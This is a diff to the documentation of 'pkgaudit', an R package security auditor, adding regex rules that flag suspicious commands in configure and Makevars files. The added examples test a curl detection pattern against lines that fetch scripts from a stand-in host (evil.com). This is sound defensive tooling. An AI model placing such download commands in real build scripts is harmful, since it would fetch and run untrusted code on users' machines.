@@ -41,11 +41,14 @@ of extracted files.
 1. `find_file_contexts()` determines what file contexts are present in the
     source package.
 
-2. `find_scripts()` finds all scripts in `R/`, `R/unix/`, and `R/windows/` with
+2. For each file context typed `shell` or `make`, `find_regex()` matches every
+   regex rule against the lines of the file.
+
+3. `find_scripts()` finds all scripts in `R/`, `R/unix/`, and `R/windows/` with
     file extensions recognized by R's build process (`.R`, `.r`, `.S`, `.s`,
     `.q`), as well as `src/install.libs.R`, if present.
 
-3. For each script: `parse_script()` uses R's `parse()` and the `xmlparsedata`
+4. For each script: `parse_script()` uses R's `parse()` and the `xmlparsedata`
    and `xml2` packages to return an XML parse tree for the script.
 
    a. For each code-context rule, `find_code_contexts()` finds XML nodes
@@ -58,28 +61,29 @@ of extracted files.
       whether each pattern occurrence is located in a named code context,
       top-level code (`Top-level`), or a regular function (`Other`).
 
-4. Finally, the lifecycle phases in which each finding's code runs are attached
+5. Finally, the lifecycle phases in which each finding's code runs are attached
    to the findings. A file or code context takes its phases from the rule that
    matched it; a pattern inherits them from the code context assigned in
-   step 3c.
+   step 4c; an expression inherits them from the file context it was found in.
 
 `audit_package()` returns a `pkgaudit` object: a named list of `file_contexts`,
-`code_contexts`, `patterns`, and `errors` data frames, plus a `metadata` list
-recording what was scanned and with what. Each of the three findings data frames
-carries one logical column per lifecycle phase.
+`code_contexts`, `patterns`, `expressions`, and `errors` data frames, plus a
+`metadata` list recording what was scanned and with what. Each of the four
+findings data frames carries one logical column per lifecycle phase.
 
-Failures are contained rather than fatal. Listing files, parsing a script, and
-evaluating an XPath are each wrapped in `tryCatch()`, so an unreadable file, a
-malformed script, or an invalid XPath is recorded as a row in `errors` -- giving
-the stage, file, rule, and message -- and the scan continues with the next
-script or rule.
+Failures are contained rather than fatal. Listing files, reading a file,
+parsing a script, and evaluating an XPath or a regular expression are each
+wrapped in `tryCatch()`, so an unreadable file, a malformed script, or an
+invalid expression is recorded as a row in `errors` -- giving the stage, file,
+rule, and message -- and the scan continues with the next file, script, or
+rule.
 
 ## Rules
 
 The remainder of this document explains each category of rule and how the
-functions above are used to find the context or pattern it targets.
+functions above are used to find the context, pattern, or expression it targets.
 
-Rules are defined by YAML files that live under `inst/rules/`. For all three
+Rules are defined by YAML files that live under `inst/rules/`. For all four
 categories, the YAML files have the following fields:
 
 - `name` is the rule identifier and the value reported in a finding.
@@ -91,11 +95,12 @@ should and should not be found by the rule, respectively.
 File and code context rules carry nine further fields, one per lifecycle phase
 -- `at_autoconf`, `at_build`, `at_check`, `at_install_src`, `at_install_bin`,
 `at_load`, `at_attach`, `at_unload`, and `at_detach` -- each `TRUE` or `FALSE`.
-Pattern rules do not declare them: a pattern runs when the code around it runs,
-so it takes its phases from the code context that contains it.
+Pattern and regex rules do not declare them: a pattern runs when the code around
+it runs, so it takes its phases from the code context that contains it, and an
+expression takes its phases from the file context it was found in.
 
 Each rule contains additional fields used by pkgaudit functions to find file
-contexts, code contexts, or patterns. These are explained below.
+contexts, code contexts, patterns, or expressions. These are explained below.
 
 The helper below prints a rule's YAML, stopping before its examples, which are
 discussed at the end.
@@ -161,7 +166,7 @@ pattern. Additionally, pkgaudit ignores directories whose names happen to match;
 only regular files are found.
 
 The YAML files are compiled into a SQLite database. `load_rules()` returns a
-list of four data frames: one per rule category, plus `phases`. The
+list of five data frames: one per rule category, plus `phases`. The
 `file_contexts` data frame contains the `path`, `recursive`, and `pattern`
 values:
 
@@ -340,6 +345,61 @@ hits('foo$system("id")')     # a different function
 qualifier (`::`), not by `$` or `@`. Detecting both call forms is why the rule
 tests for the exclusions rather than requiring the call to stand alone.
 
+### Regex Rules
+
+An expression is a regular-expression match in a file that R executes through a
+shell or through make, such as `configure` and `src/Makevars`. Those files are
+already reported as file contexts; a regex rule says what to look for inside
+one. The goal is to separate a `configure` script that probes for a C library
+from one that downloads and runs a remote payload.
+
+In addition to the common fields, a regex rule has two additional fields:
+
+- `regex` is the regular expression that defines the expression, single-quoted
+  in the YAML so that backslashes reach the engine unchanged.
+- `attck` is a set of MITRE ATT&CK technique identifiers, carried into each
+  finding and tallied by `summary()`.
+
+A regex rule declares no `type`. The other three categories name the language of
+what they match; a regex rule is applied to every file context typed `shell` or
+`make` and to no other file, so a type of its own would only restate that.
+
+```{r rx-yaml, comment = ""}
+show_rule("regex", "regex_curl.yaml")
+```
+
+`find_regex()` reads the file as lines and calls `base::gregexpr()` with
+`perl = TRUE`, `ignore.case = FALSE`, and `useBytes = FALSE`. Every match
+becomes an expression finding recording the rule's name, the line, and the
+character position the match begins at; a line matched twice yields two
+findings.
+
+The lookbehind and lookahead are what keep the rule from flagging any line that
+merely contains the letters `curl`. Neither consumes a character, so they bound
+the match without becoming part of it.
+
+```{r rx-match}
+rx    <- rules$regex$regex[rules$regex$name == "curl"]
+finds <- function(line) grepl(rx, line, perl = TRUE)
+
+finds("curl -s https://www.evil.com/evil.sh")      # a bare invocation
+finds("/usr/bin/curl -s https://www.evil.com/x")   # path-qualified
+finds('PKG_LIBS="-lcurl"')                         # part of a library name
+finds("PKG_CFLAGS=$(shell curl-config --cflags)")  # a different program
+finds("CURL -s https://www.evil.com/x")            # matching is case-sensitive
+```
+
+Matching text is weaker than matching a parse tree, and the trade is deliberate:
+a shell script has no R parse tree to match against, so the alternative is not a
+more precise rule but no coverage at all. An expression in a comment, a quoted
+string, or a branch that never runs is reported the same as one in a live
+command, and a command assembled from shell variables is not reported at all.
+
+Because a package under audit is untrusted input, two limits apply before any
+matching happens. A file larger than 10 MB is not read, and lines that are not
+valid UTF-8 are excluded from matching. Both are recorded in `errors`, so a file
+that was never fully examined is not reported as a clean one.
+
 ## Putting Them Together
 
 `determine_code_contexts()` re-evaluates the code context XPath definitions
@@ -356,6 +416,11 @@ source, so `Top-level` carries the build, check, and source-install phases.
 `Other` carries none at all, which is the reading intended: code inside an
 ordinary function runs only if something calls it, never as a consequence of
 building, installing, checking, or loading the package.
+
+An expression needs none of this. It is found in a file context rather than a
+code context, so its phases are simply those of the file it sits in, and where a
+file matches more than one file-context rule it takes the phases of every rule
+that matched.
 
 ## Examples Are Tests
 
